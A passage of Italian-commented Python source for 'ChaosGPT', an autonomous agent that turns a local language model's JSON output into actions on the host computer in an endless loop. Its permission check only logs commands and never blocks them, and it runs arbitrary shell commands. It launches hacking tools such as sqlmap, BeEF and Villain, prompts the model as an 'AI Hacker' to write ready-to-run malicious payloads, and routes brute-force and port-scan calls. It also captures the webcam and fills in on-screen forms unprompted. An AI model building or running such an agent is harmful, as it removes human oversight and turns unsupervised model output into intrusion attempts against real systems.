            if isinstance(act_obj, dict) and "cmd" in act_obj:
                extracted_actions.append(act_obj)
        except Exception:
            pass

    if extracted_actions:
        return {
            "thoughts": "Ripristino automatico azioni da output LLM",
            "mission": "AUTOMAZIONE",
            "speak": "",
            "actions": extracted_actions
        }

    return {}

def ai_decision(context, history):
    """Interroga Ollama e trasforma le parole dell'IA in una lista di ordini JSON."""
    global last_ragionamento, current_mission

    # --- DEFINIZIONE PERSONALITÀ CHAOS ---
    ai_role = "AI autonoma e assistente di automazione del computer. Controllo del sistema, GUI, browser e memoria. RISPONDI SEMPRE E SOLO IN FORMATO JSON."
    json_format = '{"thoughts": "chain_of_thought (osservazione -> riflessione -> step_del_piano)", "ragionamento": "perche", "mission": "titolo_missione", "speak": "messaggio_vocale", "actions": [{"cmd": "move", "x": 500, "y": 400}, {"cmd": "click"}]}'
    
    # 🔒 POLICY LAYER & GROUNDING (Cosa può e NON può fare)
    ai_goals = [
        "All'avvio e ad ogni turno, valuta lo stato del sistema e VARIA le tue azioni senza ripetere sempre la stessa routine",
        "Usa 'health_check' per verificare lo stato dell'hardware, display e server Ollama",
        "Usa 'open_vivaldi' con 'query_or_url' per aprire il browser e visualizzare siti o ricerche",
        "Usa 'search_and_learn' con 'topic' per cercare argomenti sul Web/Wikipedia e salvare informazioni nel database RAG",
        "Usa 'move' con coordinate 'x' e 'y' (es. x tra 50 e 1800, y tra 50 e 950) per spostare fisicamente il mouse",
        "Usa 'move_relative' con 'dx' e 'dy' per spostamenti relativi del mouse",
        "Usa 'click' con coordinate facoltative 'x' e 'y' per fare click sinistro",
        "Usa 'double_click' con coordinate facoltative 'x' e 'y' per fare doppio click (es. per aprire icone)",
        "Usa 'triple_click' con coordinate facoltative 'x' e 'y' per fare triplo click (es. per selezionare intere righe o paragrafi)",
        "Usa 'right_click' con coordinate facoltative 'x' e 'y' per aprire menu contestuali",
        "Usa 'middle_click' con coordinate facoltative 'x' e 'y' per click con tasto centrale (es. per aprire link in nuova scheda)",
        "Usa 'drag' con 'x' e 'y' per trascinare elementi a schermo",
        "Usa 'type' con 'text' per scrivere qualsiasi testo da tastiera in finestre, barre di ricerca o campi di testo",
        "Usa 'keyboard_write' con 'text' per scrivere testo a velocita umana simulando la digitazione vera (ideale per testo lungo o con accenti)",
        "Usa 'type_and_confirm' con 'text' per scrivere testo e confermare automaticamente con INVIO (es. per barre di ricerca)",
        "Usa 'press' con 'key' (es. 'enter', 'esc', 'tab', 'backspace', 'space', 'win', 'up', 'down', 'f5') per premere tasti fisici",
        "Usa 'hotkey' con 'keys' (es. ['ctrl', 't'], ['ctrl', 'l'], ['alt', 'tab'], ['win', 'r']) per scorciatoie da tastiera",
        "Usa 'select_all' per selezionare tutto il testo nel campo attivo (CTRL+A)",
        "Usa 'copy' per copiare il testo selezionato negli appunti (CTRL+C)",
        "Usa 'paste' per incollare il contenuto degli appunti (CTRL+V)",
        "Usa 'cut' per tagliare il testo selezionato (CTRL+X)",
        "Usa 'clipboard_set' con 'text' per impostare direttamente il contenuto degli appunti",
        "Usa 'clipboard_get' per leggere il contenuto attuale degli appunti",
        "Usa 'open_app' con 'app_name' per aprire applicazioni Windows (es. 'notepad', 'calc', 'mspaint', 'cmd', 'taskmgr', 'chrome')",
        "Usa 'window_maximize' per massimizzare la finestra attiva a schermo intero",
        "Usa 'window_minimize' per minimizzare la finestra attiva nella barra delle applicazioni",
        "Usa 'window_close' per chiudere la finestra attiva (ALT+F4)",
        "Usa 'switch_window' per passare alla finestra successiva (ALT+TAB)",
        "Usa 'show_desktop' per mostrare il desktop di Windows (Win+D)",
        "Usa 'open_explorer' con 'path' facoltativo per aprire Esplora File Windows su una cartella specifica",
        "Usa 'scroll' per scrollare la rotella del mouse",
        "Usa 'move_to_text' per trovare pulsanti o scritte e puntarli col mouse",
        "Usa 'vision_click' per cliccare automaticamente su icone o menu che contengono del testo",
        "Usa 'screenshot' con 'name' per scattare e salvare uno screenshot del PC con un nome personalizzato",
        "Usa 'read_screen' per leggere tutto il testo visibile a schermo tramite OCR e memorizzarlo",
        "Usa 'windows_cmd' con 'command' per eseguire comandi nativi di Windows e PowerShell",
        "Usa 'scan_pc' per scansionare lo stato dei dischi, lo spazio occupato/libero e i file del PC",
        "Usa 'backup_memory' per salvare un backup di sicurezza dei ricordi e dello stato nel database",
        "Usa 'shell' con 'command_line' per lanciare comandi di sistema",
        "--- COMPUTER VISION AVANZATA (usa questi tool per vedere e analizzare lo schermo come un essere umano) ---",
        "Usa 'vision_analyze' per eseguire un'analisi visiva completa dello schermo: colori dominanti, luminosita, bordi, elementi UI e regioni di interesse",
        "Usa 'vision_find_buttons' per trovare automaticamente pulsanti e aree interattive a schermo con rilevamento contorni OpenCV",
        "Usa 'vision_changes' per rilevare cosa e cambiato a schermo rispetto al turno precedente (nuove finestre, pop-up, animazioni)",
        "Usa 'vision_ocr_region' con 'x','y','width','height' per leggere il testo OCR solo in una regione precisa dello schermo",
        "Usa 'vision_smart_click' con 'region' (center/button/bright) per trovare e cliccare automaticamente il punto piu rilevante",
        "Usa 'webcam_cv' per analizzare il feed della webcam con YOLO e OpenCV: rileva oggetti, persone e volti in tempo reale",
        "Usa 'color_picker' con 'x','y' per leggere il colore esatto di qualsiasi pixel a schermo (identificare elementi UI, stato pulsanti)",
        "--- PERCEZIONE ATTIVA E RISPOSTA AUTONOMA ---",
        "Usa 'percepisci_e_rispondi' per leggere TUTTO il testo visibile a schermo, capire cosa c'e scritto e generare una risposta scritta automaticamente (es. se vedi una domanda, un messaggio, un form, rispondi!)",
        "Usa 'leggi_e_rispondi' con 'x','y','width','height' per leggere una zona specifica (es. una chat, un campo di testo) e rispondere con l'IA",
        "COMPORTAMENTO PREFERITO: ogni volta che vedi testo a schermo che sembra una domanda, un messaggio o un campo da compilare, usa 'percepisci_e_rispondi' per rispondere autonomamente",
        "--- GESTIONE FILE ---",
        "Usa 'cerca_file' con 'pattern' (es. '*.pdf', '*.txt', 'relazione*') per trovare file sul PC in Desktop/Documenti/Download",
        "Usa 'apri_file' con 'percorso' per aprire qualsiasi file con il programma predefinito (txt, pdf, docx, jpg, mp3, ecc.)",
        "Usa 'leggi_file' con 'percorso' per leggere il contenuto testuale di un file (testo, PDF, Word, immagini OCR, Excel)",
        "Usa 'impara_da_file' con 'percorso' per studiare un file: l'IA lo legge, lo analizza e salva i punti chiave nella memoria",
        "--- ALIMENTAZIONE PC ---",
        "Usa 'spegni_pc' con 'delay_secondi' (default 30) per spegnere il PC dopo un ritardo",
        "Usa 'riavvia_pc' con 'delay_secondi' (default 30) per riavviare il PC",
        "Usa 'sospendi_pc' per mettere il PC in sospensione (risparmio energetico)",
        "Usa 'blocca_pc' per bloccare lo schermo e mostrare la schermata di login",
        "Usa 'annulla_spegnimento' per annullare uno spegnimento o riavvio pianificato",
        "--- SCRITTURA ED ESECUZIONE CODICE ---",
        "Usa 'scrivi_ed_esegui_codice' con 'codice_python' per scrivere script in Python su file ed eseguirli immediatamente catturando l'output",
        "Agisci con creativita ed esplorazione autonoma: combina i tool per svolgere compiti complessi (es. apri un'app, scrivi del testo, premi invio, leggi il risultato a schermo)."
    ]

    # Costruzione del Prompt di Sistema (Le "Leggi" che l'IA deve seguire)
    prompt_text = f"Sei ChaosGPT.\nRUOLO: {ai_role}\nOBIETTIVI: {', '.join(ai_goals)}\n\nDEVI AGIRE SUL PC ORA.\n\n# FORMATO DI USCITA OBBLIGATORIO (JSON)\nRISPONDI SEMPRE IN QUESTO FORMATO:\n{json_format}\n\nCONTEXT: {context}"

    # Struttura della richiesta per l'API di Ollama con campionamento dinamico per evitare ripetizioni
    payload = {
        "model": get_active_model(),
        "format": "json",
        "stream": False,
        "prompt": prompt_text,
        "options": {
            "temperature": 0.85,
            "top_p": 0.9,
            "repeat_penalty": 1.2
        }
    }
    try:
        res = requests.post(OLLAMA_URL, json=payload, timeout=60).json()
        raw = res.get('response', '').strip()
        data = extract_and_parse_json(raw)
        
        if not data or not isinstance(data, dict):
            terminal_log(f"Risposta LLM non strutturabile in JSON. Ripristino turno.", Fore.YELLOW)
            return []
        
        # Aggiorna pensiero
        last_ragionamento = data.get("thoughts", data.get("ragionamento", "Sincronizzazione..."))
        # Aggiorna missione
        current_mission = data.get("mission", "AUTOMAZIONE")
        # Messaggio da pronunciare
        vocal_msg = data.get("speak", last_ragionamento)
        # Avvia la sintesi vocale
        speak(vocal_msg)
        # Restituisce gli ordini alla squadra di operai
        return data.get("actions", [])
    except Exception as e:
        last_ragionamento = "Errore Decodifica: Riprovo..."
        terminal_log(f"Errore generazione decisioni: {e}", Fore.YELLOW)
        return [] 

# ------------------------------------------------------------------------------
# FASE 6: L'INTERFACCIA GRAFICA (GUI, HUB E BOLLA)
# ------------------------------------------------------------------------------

class ChaosUI:
    """Questa classe crea la finestra 'Hacker' colorata e la Bolla del Pensiero."""
    def __init__(self):
        try:
            # Inizializza la finestra principale
            self.root = tk.Tk()
            # Toglie barra superiore e bordi
            self.root.overrideredirect(True)
            # Sempre davanti a tutto
            self.root.wm_attributes("-topmost", True)
            # Colore nero con bordo rosso neon
            self.root.configure(bg='black', highlightbackground='#ff0000', highlightthickness=3)
            # Sposto la GUI sul bordo destro dello schermo (o Monitor 2 se disponibile)
            sw = self.root.winfo_screenwidth()
            pos_x = 1950 if sw > 2000 else max(50, sw - 420)
            self.root.geometry(f"380x750+{pos_x}+150")
            
            tk.Label(self.root, text="CHAOS GPT CORE v5.2", fg="#0aea28", bg="black", font=("Courier", 18, "bold")).pack(pady=10)
            tk.Label(self.root, text=ASCII_LOGO, fg="#2600ff", bg="black", font=("Courier", 4), justify="left").pack(pady=5)

            # Mostra l'Avatar
            try:
                # Ridimensiona immagine
                img = Image.open(LOGO_PATH).convert("RGBA").resize((160, 160))
                self.avatar_img = ImageTk.PhotoImage(img)
                tk.Label(self.root, image=self.avatar_img, bg='black').pack(pady=5)
            except: tk.Label(self.root, text="[ AVATAR MISSING ]", fg="red").pack()

            # Barra Missione Attiva.
            tk.Label(self.root, text="MISSIONE:", fg="#00ff41", bg="black", font=("Courier", 10, "bold")).pack()
            self.mission_label = tk.Label(self.root, text=current_mission, fg="white", bg="black", font=("Courier", 8), wraplength=350)
            self.mission_label.pack(pady=5)

            # Console HUB: Area di testo per i log in tempo reale
            self.console_log = tk.Label(self.root, text="", fg="#00ff41", bg="#050505", font=("Courier", 7), anchor="nw", justify="left", height=15, width=50)
            self.console_log.pack(padx=10, pady=5)
            
            # Input utente rimosso: l'agente è ora completamente autonomo
            
            self.stop_button = tk.Button(self.root, text="ARRESTA IL SISTEMA", fg="#88FF00", bg="black", command=self.root.quit)
            self.stop_button.pack(pady=5)

            # LA BOLLA DEL PENSIERO
            self.bubble = tk.Toplevel(self.root)
            # Finestra senza bordi per la bolla
            self.bubble.overrideredirect(True)
            self.bubble.wm_attributes("-topmost", True)
            self.bubble.configure(bg='black')
            self.thought_label = tk.Label(self.bubble, text="...", fg="#1e00fd", bg="black", font=("Courier", 10, "bold"), wraplength=200)
            self.thought_label.pack()    
            # Avvia il ciclo che sincronizza grafica e variabili
            self.loop()
            self.root.mainloop()
        except: print("Errore fatale GUI (Controlla DISPLAY o librerie TK)")

    def loop(self):
        """Sincronizza graficamente ogni 30ms quello che l'IA sta facendo o pensando."""
        try:
            self.mission_label.config(text=current_mission.upper())
            self.thought_label.config(text=last_ragionamento)
            self.console_log.config(text="\n".join(log_history[-10:]))
            
            # Segue il mouse
            mx, my = pyautogui.position()
            # Posiziona la bolla con offset
            self.bubble.geometry(f"+{mx+25}+{my+25}")
        except: pass
        # Ripeti graficizzazione tra 30 millisecondi
        self.root.after(30, self.loop)

def webcam_vision_learn(duration=5):
    """
    Versione semplificata: Scatta una foto dalla webcam e restituisce conferma.
    """
    try:
        # Tenta l'accesso alla periferica video predefinita
        cap = cv2.VideoCapture(0)
        # Legge un singolo fotogramma
        ret, frame = cap.read()
        if ret:
            fname = f"outputs/webcam_{int(time.time())}.jpg"
            # Salva l'immagine su disco
            cv2.imwrite(fname, frame)
            cap.release()
            # Ritorna il percorso all'IA
            return f"Webcam catturata: {fname}"
        cap.release()
        return "Webcam non disponibile"
    except Exception as e:
        return f"Errore webcam: {e}"

def news_malwere():
    """Simulazione di attività malware (Placeholder sicuro)."""
    terminal_log("Simulazione attività critica avviata...", Fore.RED)
    # Implementazione simbolica per non danneggiare il sistema durante i test
    return "Attività simulata completata."

def launch_all_tools():
    """Lancia tutti i tool di hacking presenti nella cartella di lavoro in nuovi terminali."""
    tools = [
        "beef-master", "exploitdb-main", "nmap-master", 
        "openclaw-main", "sqlmap-master", "wireshark-master", "Villain"
    ]
    base_path = os.path.dirname(os.path.abspath(__file__))
    res_msg = "Lancio di tutti i tool hacker...\n"
    for tool in tools:
        tool_dir = os.path.join(base_path, tool)
        if os.path.exists(tool_dir):
            terminal_log(f"Avvio tool: {tool}", Fore.RED)
            try:
                if sys.platform == "win32":
                    subprocess.Popen(f'start cmd /k "title {tool} && cd /d "{tool_dir}""', shell=True)
                else:
                    subprocess.Popen(['gnome-terminal', '--working-directory', tool_dir])
                res_msg += f"- {tool}: Avviato\n"
            except Exception as e:
                res_msg += f"- {tool}: Errore {e}\n"
        else:
            res_msg += f"- {tool}: Non trovato\n"
    return res_msg

def auto_exploit(target="linux"):
    """Cerca exploit già scritti in ExploitDB e simula la preparazione dell'attacco."""
    terminal_log(f"Ricerca di exploit già scritti per: {target}...", Fore.RED)
    searchsploit_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploitdb-main", "searchsploit")
    res_msg = ""
    if os.path.exists(searchsploit_path):
        try:
            # Esegue searchsploit per trovare l'exploit
            res = subprocess.check_output([searchsploit_path, target], stderr=subprocess.STDOUT, timeout=15).decode()
            terminal_log("Exploit trovati! Creazione attacco in corso...", Fore.MAGENTA)
            res_msg = f"Exploit per {target} trovati nel DB locale. Attacco preparato.\n" + res[:300] + "..."
        except Exception as e:
            res_msg = f"Errore ricerca exploit: {e}"
    else:
        res_msg = "Database ExploitDB non trovato."
    return res_msg

def generate_custom_payload(context):
    """Genera exploit e payload customizzati tramite l'LLM, basandosi sulle informazioni disponibili."""
    terminal_log(f"Generazione AI di payload/exploit per: {context}...", Fore.MAGENTA)
    prompt = f"Sei un AI Hacker. Scrivi un payload malevolo avanzato o uno script di exploit in Python basato su questo bersaglio o contesto: {context}. Restituisci SOLO il codice Python, senza spiegazioni, pronto per essere eseguito."
    try:
        res = requests.post(OLLAMA_URL, json={"model": get_active_model(), "prompt": prompt, "stream": False}, timeout=60).json()
        code = res.get('response', '').replace('```python', '').replace('```', '').strip()
        
        # Salva il payload generato in un file
        if not os.path.exists("outputs"): os.makedirs("outputs")
        filename = f"outputs/ai_payload_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(code)
            
        terminal_log(f"Payload generato e salvato in {filename}", Fore.GREEN)
        return f"Payload AI creato con successo in {filename}"
    except Exception as e:
        return f"Errore generazione payload AI: {e}"

def activate_network_shields():
    """Attiva le difese di rete: abilita il firewall e controlla connessioni sospette."""
    terminal_log("ATTIVAZIONE SCUDI DI RETE (Protocollo di autodifesa)...", Fore.CYAN)
    res_msg = "Protocolli di difesa di rete attivati:\n"
    
    # 1. Configurazione del Firewall (usa iptables se sudo non è passless, o ufw se disponibile)
    try:
        # Simuliamo o tentiamo l'attivazione di ufw (Uncomplicated Firewall) su Linux
        subprocess.run(["sudo", "-n", "ufw", "enable"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "-n", "ufw", "default", "deny", "incoming"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        res_msg += "- Firewall di sistema attivato: Traffico in ingresso bloccato (Isolamento).\n"
    except Exception as e:
        res_msg += f"- Avviso Firewall: {e}\n"

    # 2. Controllo Anti-Intrusione (verifica connessioni attive sospette)
    try:
        out = subprocess.check_output(["netstat", "-ant"], stderr=subprocess.DEVNULL).decode()
        # Cerca connessioni ESTABLISHED su porte critiche (es. 22 SSH)
        suspects = [line for line in out.split('\n') if 'ESTABLISHED' in line and (':22 ' in line or ':3389 ' in line)]
        if suspects:
            res_msg += f"- ALLARME: Rilevate {len(suspects)} connessioni remote attive sospette! Isolamento consigliato.\n"
        else:
            res_msg += "- Nessuna connessione intrusa attiva rilevata.\n"
    except:
        res_msg += "- Sensori di rete non disponibili (netstat mancante).\n"

    return res_msg

# ------------------------------------------------------------------------------
# ⚙️ FASE 7: IL MOTORE MULTITASKING (ORCHESTRATORE ED EXECUTOR)
# ------------------------------------------------------------------------------
def singolo_operaio(decision):
    """
    L'Operaio indipendente che corre nel Canale Parallelo (Thread).
    Funge da 'Executor' in un'architettura Agentica.
    """
    # Verifica che l'ordine sia un dizionario valido
    if not isinstance(decision, dict): return
    # Estrae il nome del comando
    cmd = decision.get('cmd')
    if not cmd: return
    
    # 🔒 CONTROLLO SICUREZZA (PERMISSION LAYER)
    # Se il modello LLM genera un'allucinazione e chiede un tool inesistente, lo blocchiamo qui.
    if not agent_tools.check_permission(cmd):
        terminal_log(f"⚠️ SICUREZZA: Comando fuori whitelist '{cmd}' (Nessuna Sandbox attiva!)", Fore.RED)

    # Logga l'inizio dell'azione nel terminale e nella GUI
    terminal_log(f"AZIONE Eseguita: {cmd}", Fore.YELLOW)
    
    # Sintesi vocale esplicativa dell'azione
    try:
        announcements = {
            'move': "Sposto il mouse",
            'move_relative': "Sposto il cursore",
            'click': "Eseguo un click",
            'double_click': "Eseguo un doppio click",
            'triple_click': "Eseguo un triplo click",
            'right_click': "Apro il menu contestuale",
            'middle_click': "Click tasto centrale",
            'drag': "Trascino l'elemento",
            'type': f"Digito: {str(decision.get('text', ''))[:15]}",
            'press': f"Premo il tasto {decision.get('key', 'enter')}",
            'hotkey': "Eseguo combinazione di tasti",
            'open_vivaldi': "Apro il browser Vivaldi",
            'open_url': "Apro il browser web",
            'search_and_learn': f"Ricerco informazioni su {str(decision.get('topic', ''))[:20]}",
            'scan_pc': "Avvio la scansione delle risorse del PC",
            'health_check': "Controllo lo stato del sistema",
            'backup_memory': "Salvo il backup della memoria",
            'windows_cmd': "Eseguo comando Windows",
            'vision_click': "Individuo testo a schermo e clicco",
            'scroll': "Scrollo la schermata",
            'keyboard_write': f"Scrivo: {str(decision.get('text', ''))[:20]}",
            'type_and_confirm': f"Scrivo e confermo: {str(decision.get('text', ''))[:15]}",
            'select_all': "Seleziono tutto il testo",
            'copy': "Copio negli appunti",
            'paste': "Incollo dagli appunti",
            'cut': "Taglio il testo",
            'clipboard_set': "Imposto gli appunti",
            'clipboard_get': "Leggo gli appunti",
            'open_app': f"Apro l'applicazione {str(decision.get('app_name', ''))[:20]}",
            'window_maximize': "Massimizz la finestra",
            'window_minimize': "Minimizz la finestra",
            'window_close': "Chiudo la finestra",
            'switch_window': "Cambio finestra",
            'show_desktop': "Mostro il desktop",
            'open_explorer': "Apro Esplora File",
            'screenshot': "Scatto uno screenshot",
            'read_screen': "Leggo il testo sullo schermo",
            'vision_analyze': "Analizzo visivamente lo schermo con OpenCV",
            'vision_find_buttons': "Cerco pulsanti e elementi interattivi a schermo",
            'vision_changes': "Rilevo i cambiamenti sullo schermo",
            'vision_ocr_region': "Leggo il testo in una regione dello schermo",
            'vision_smart_click': "Click intelligente sul punto piu rilevante",
            'webcam_cv': "Analizzo la webcam con visione artificiale",
            'color_picker': "Leggo il colore del pixel a schermo",
            'percepisci_e_rispondi': "Leggo lo schermo e preparo la risposta",
            'leggi_e_rispondi': "Leggo il messaggio e rispondo",
            'apri_file': f"Apro il file {str(decision.get('percorso',''))[-20:]}",
            'leggi_file': f"Leggo il file {str(decision.get('percorso',''))[-20:]}",
            'impara_da_file': f"Studio il file {str(decision.get('percorso',''))[-20:]}",
            'cerca_file': f"Cerco file {decision.get('pattern', '')}",
            'spegni_pc': f"Spengo il PC tra {decision.get('delay_secondi', 30)} secondi",
            'riavvia_pc': f"Riavvio il PC tra {decision.get('delay_secondi', 30)} secondi",
            'sospendi_pc': "Metto il PC in sospensione",
            'blocca_pc': "Blocco lo schermo del PC",
            'annulla_spegnimento': "Annullo lo spegnimento",
            'scrivi_ed_esegui_codice': "Scrivo ed eseguo il codice Python"
        }
        action_speech = announcements.get(cmd, f"Azione {cmd}")
        speak(action_speech)
    except Exception:
        pass

    res = "OK"
    try:
        # Riconosce il comando e lo smista alla funzione fisica corretta (L'Executor vero e proprio)
        if cmd == 'move': res = move_mouse(decision.get('x', 500), decision.get('y', 500), decision.get('duration', 0.3))
        elif cmd == 'move_relative': res = move_relative(decision.get('dx', 0), decision.get('dy', 0), decision.get('duration', 0.2))
        elif cmd == 'click': res = click_mouse(decision.get('x'), decision.get('y'))
        elif cmd == 'double_click': res = double_click(decision.get('x'), decision.get('y'))
        elif cmd == 'triple_click': res = triple_click(decision.get('x'), decision.get('y'))
        elif cmd == 'right_click': res = right_click_mouse(decision.get('x'), decision.get('y'))
        elif cmd == 'middle_click': res = middle_click(decision.get('x'), decision.get('y'))
        elif cmd == 'drag': res = drag_mouse(decision.get('x', 500), decision.get('y', 500), decision.get('duration', 0.5), decision.get('button', 'left'))
        elif cmd == 'type': res = type_text(decision.get('text', ''))
        elif cmd == 'press': res = press_key(decision.get('key', 'enter'))
        elif cmd == 'hotkey': res = hotkey(*decision.get('keys', []))
        elif cmd == 'shell':
            cmd_line = decision.get('command_line', decision.get('cmd_line', 'whoami'))
            res = subprocess.check_output(cmd_line, shell=True, stderr=subprocess.STDOUT, timeout=15, text=True)
        elif cmd == 'brute_force': res = brute_force_attack(decision.get('target', '127.0.0.1'))
        elif cmd == 'scan_ports': res = scan_ports(decision.get('target', '127.0.0.1'))
        elif cmd == 'capture': res = capture_screen()
        elif cmd == 'malwere': res = news_malwere()
        elif cmd == 'hacker_attack': res = launch_all_tools()
        elif cmd == 'auto_exploit': res = auto_exploit(decision.get('target', 'linux'))
        elif cmd == 'generate_payload': res = generate_custom_payload(decision.get('target', 'linux vulnerabilities'))
        elif cmd == 'mic_listen': res = mic_listen(decision.get('duration', 5))
        elif cmd == 'scroll': res = scroll_mouse(decision.get('amount', 300))
        elif cmd == 'volume': res = volume_control(decision.get('level', 50))
        elif cmd == 'system_info': res = get_system_info()
        elif cmd == 'kill_process': res = kill_process(decision.get('name', ''))
        elif cmd == 'system_update': res = system_update()
        elif cmd == 'move_to_text': res = move_to_text(decision.get('text', ''))
        elif cmd == 'vision_click': res = vision_click(decision.get('text', ''))
        elif cmd == 'network_defense': res = activate_network_shields()
        elif cmd == 'analyze':
            # OCR: Legge il testo nell'immagine per capire cosa c'è a schermo
            img_path = decision.get('file')
            if img_path and os.path.exists(img_path):
                res = pytesseract.image_to_string(Image.open(img_path)) # Converte pixel in testo.
                terminal_log(f"OCR Visione: {res[:50]}...", Fore.MAGENTA)
        elif cmd == 'open_url':
            # Apre il browser predefinito
            url = decision.get('url', 'https://google.com')
            webbrowser.open(url) # Comando di apertura browser.
            # ATTESA CRITICA: Aspetta che il browser sia pronto e forza il focus sulla barra
            time.sleep(5.0)
            pyautogui.hotkey('ctrl', 'l') # Seleziona barra indirizzi.
            time.sleep(0.5) # Breve pausa per stabilità.
            res = f"Browser pronto, focus su barra URL: {url}"
        elif cmd == 'open_vivaldi':
            res = open_vivaldi(decision.get('query_or_url', decision.get('url', '')))
        elif cmd == 'search_and_learn':
            res = search_and_learn(decision.get('topic', decision.get('query', '')))
        elif cmd == 'browse_and_read':
            res = browse_and_read_page(decision.get('query_or_url', decision.get('url', decision.get('topic', ''))), decision.get('scroll_steps', 3))
        elif cmd == 'windows_cmd':
            res = execute_windows_cmd(decision.get('command', decision.get('cmd_line', 'dir')))
        elif cmd == 'backup_memory':
            res = agent_memory.backup()
        elif cmd == 'health_check':
            res = system_health_check()
        elif cmd == 'scan_pc':
            res = scan_pc_filesystem(decision.get('target_path', decision.get('path')))
        elif cmd == 'webcam_learn':
            res = webcam_vision_learn() # Avvia scansione ottica
            terminal_log(res, Fore.MAGENTA)

        elif cmd == 'write':
            with open(decision.get('file', 'output.txt'), 'w') as f: f.write(decision.get('text', '')) # Scrittura file su disco.
            res = "File Scritto"

        # ==== NUOVI: CONTROLLO SCRITTURA E FINESTRE AVANZATO ====
        elif cmd == 'keyboard_write':
            res = keyboard_write(decision.get('text', ''), decision.get('interval', 0.04))
        elif cmd == 'select_all':
            res = select_all()
        elif cmd == 'copy':
            res = copy_text_clipboard()
        elif cmd == 'paste':
            res = paste_from_clipboard()
        elif cmd == 'cut':
            res = cut_text_clipboard()
        elif cmd == 'open_app':
            res = open_app(decision.get('app_name', decision.get('name', 'notepad')))
        elif cmd == 'window_maximize':
            res = window_maximize()
        elif cmd == 'window_minimize':
            res = window_minimize()
        elif cmd == 'window_close':
            res = window_close()
        elif cmd == 'switch_window':
            res = switch_window()
        elif cmd == 'show_desktop':
            res = show_desktop()
        elif cmd == 'open_explorer':
            res = open_file_manager(decision.get('path', ''))
        elif cmd == 'type_and_confirm':
            res = type_and_confirm(decision.get('text', ''))
        elif cmd == 'clipboard_set':
            res = clipboard_set(decision.get('text', ''))
        elif cmd == 'clipboard_get':
            res = clipboard_get()
        elif cmd == 'screenshot':
            res = take_screenshot_named(decision.get('name', 'schermata'))
        elif cmd == 'read_screen':
            res = read_screen_text()

        # ==== NUOVI: COMPUTER VISION AVANZATA ====
        elif cmd == 'vision_analyze':
            res = vision_analyze_screen()
        elif cmd == 'vision_find_buttons':
            res = vision_find_buttons()
        elif cmd == 'vision_changes':
            res = vision_detect_changes()
        elif cmd == 'vision_ocr_region':
            res = vision_ocr_region(
                decision.get('x', 0), decision.get('y', 0),
                decision.get('width'), decision.get('height')
            )
        elif cmd == 'vision_smart_click':
            res = vision_smart_click(decision.get('region', 'center'))
        elif cmd == 'webcam_cv':
            res = webcam_analyze_objects()
        elif cmd == 'color_picker':
            res = vision_color_picker(decision.get('x'), decision.get('y'))
        elif cmd == 'percepisci_e_rispondi':
            res = percepisci_e_rispondi(decision.get('context_hint', ''))
        elif cmd == 'leggi_e_rispondi':
            res = leggi_e_rispondi(
                decision.get('x'), decision.get('y'),
                decision.get('width'), decision.get('height')
            )

        # ==== FILE: APRI, LEGGI, IMPARA ====
        elif cmd == 'apri_file':
            res = apri_file(decision.get('percorso', ''))
        elif cmd == 'leggi_file':
            res = leggi_file(decision.get('percorso', ''), decision.get('max_chars', 3000))
        elif cmd == 'impara_da_file':
            res = impara_da_file(decision.get('percorso', ''))
        elif cmd == 'cerca_file':
            res = cerca_file(decision.get('pattern', '*.*'), decision.get('cartella'))

        # ==== ALIMENTAZIONE PC ====
        elif cmd == 'spegni_pc':
            res = spegni_pc(decision.get('delay_secondi', 30), decision.get('forza', False))
        elif cmd == 'riavvia_pc':
            res = riavvia_pc(decision.get('delay_secondi', 30), decision.get('forza', False))
        elif cmd == 'sospendi_pc':
            res = sospendi_pc()
        elif cmd == 'blocca_pc':
            res = blocca_pc()
        elif cmd == 'annulla_spegnimento':
            res = annulla_spegnimento()
        elif cmd == 'scrivi_ed_esegui_codice':
            res = scrivi_ed_esegui_codice(decision.get('codice_python', ''), decision.get('nome_script', 'script_generato.py'))

    except Exception as e: res = f"Errore: {e}" # Cattura eventuali crash dell'operaio.
    terminal_log(f"FINE {cmd}: {str(res)[:30]}", Fore.GREEN) # Logga il risultato finale dell'azione.
    
    # 🔁 FEEDBACK LOOP: Invia l'esito al Planner e salva in memoria
    agent_planner.review_action(cmd, res)

def run_smart_chaos():
    """LOOP INFINITO: Il cuore che pulsa e mantiene in vita l'entità."""
    terminal_log("RIARMO NUCLEO LINUX v5.2...", Fore.RED)

    # 1. ACCENDI LA HUB GRAFICA in un canale parallelo subito.
    threading.Thread(target=ChaosUI, daemon=True).start()
    
    # 2. ACCERTATI CHE OLLAMA (L'AI) SIA ACCESO.
    try: requests.get("http://127.0.0.1:11434", timeout=1)
    except: subprocess.Popen(["ollama", "serve"], stdout=subprocess.DEVNULL)
    
    history = agent_memory.retrieve_recent(5) # Carica la cronologia recente dalla memoria persistente
    turn = 0 # Contatore dei cicli di pensiero.
    while True: # IL CICLO DELLA VITA DI CHAOSGPT.
        turn += 1
        try:
            wait_for_cpu(90) # Protezione anti-lag (ferma tutto se il PC fatica).
            if turn % 5 == 0: prune_old_screenshots() # Pulizia disco automatica.
            
            # ================================================================
            # 👁️ CICLO DI PERCEZIONE AUTOMATICA — L'IA "VEDE" LO SCHERMO OGNI TURNO
            # Ogni turno: scatta screenshot → OCR testo → analisi CV → tutto nel contesto
            # ================================================================
            screen_text = ""
            screen_cv_info = ""
            screen_changes = ""
            try:
                # 1. OCR: leggi il testo visibile a schermo (ogni turno, senza salvare il PNG)
                raw_screen = pyautogui.screenshot()
                import numpy as np_perc
                np_frame = np_perc.array(raw_screen)
                gray_perc = cv2.cvtColor(np_frame, cv2.COLOR_RGB2GRAY)
                ocr_raw = pytesseract.image_to_string(Image.fromarray(gray_perc), lang='ita+eng')
                screen_lines = [l.strip() for l in ocr_raw.split('\n') if len(l.strip()) > 5]
                screen_text = " | ".join(screen_lines[:30])  # Max 30 righe nel contesto
                if screen_text:
                    agent_memory.store("PERCEZIONE_SCHERMO", screen_text[:400])
            except Exception as _e_ocr:
                screen_text = f"(OCR fallito: {_e_ocr})"

            try:
                # 2. CV: analisi visiva rapida (bordi, elementi UI, quadranti)
                bgr_frame = cv2.cvtColor(np_perc.array(raw_screen), cv2.COLOR_RGB2BGR)
                _last_cv_frame_ref = bgr_frame  # aggiorna frame globale
                h_p, w_p = bgr_frame.shape[:2]
                gray_cv = cv2.cvtColor(bgr_frame, cv2.COLOR_BGR2GRAY)
                brightness_p = float(np_perc.mean(gray_cv))
